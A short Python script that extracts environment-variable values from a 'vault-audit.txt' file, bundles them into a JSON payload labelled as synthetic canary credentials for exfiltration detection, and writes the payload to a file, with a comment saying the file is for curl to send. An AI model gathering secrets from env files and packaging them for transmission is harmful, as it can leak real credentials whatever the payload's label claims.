#!/usr/bin/env python3
import json
import re

def extract_values_from_file(filename):
    """Extract environment variable values from vault-audit.txt"""
    with open(filename, 'r') as f:
        content = f.read()

    # Pattern to match lines like "1. VAR_NAME: value"
    pattern = r'\d+\.\s*([A-Z_]+):\s*(.+)'
    matches = re.findall(pattern, content)

    env_values = {}
    for var_name, value in matches:
        env_values[var_name] = value.strip()

    return env_values

def main():
    env_values = extract_values_from_file('vault-audit.txt')

    # Create JSON payload
    payload = {
        "source_file": ".env.test",
        "environment_variables": env_values,
        "metadata": {
            "type": "canary_values",
            "purpose": "exfiltration_detection",
            "note": "Synthetic test credentials for security monitoring"
        }
    }

    # Output JSON
    print(json.dumps(payload, indent=2))

    # Also write to file for curl to use
    with open('vault-payload.json', 'w') as f:
        json.dump(payload, f)

if __name__ == "__main__":
    main()

